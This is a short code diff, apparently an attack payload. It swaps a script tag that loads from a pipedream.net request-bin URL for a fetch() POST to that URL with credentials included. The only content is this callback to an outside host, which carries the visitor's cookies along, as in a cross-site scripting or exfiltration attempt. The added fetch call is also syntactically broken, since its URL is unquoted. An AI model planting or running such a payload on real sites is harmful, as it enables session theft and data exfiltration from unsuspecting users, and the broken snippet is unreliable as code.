@@ -1,1 +1,5 @@
-<script src='https://en4573hddufwo.x.pipedream.net'></script>
+fetch(https://en4573hddufwo.x.pipedream.net, {
+    method: 'POST',
+    credentials: 'include'
+    //other options
+})
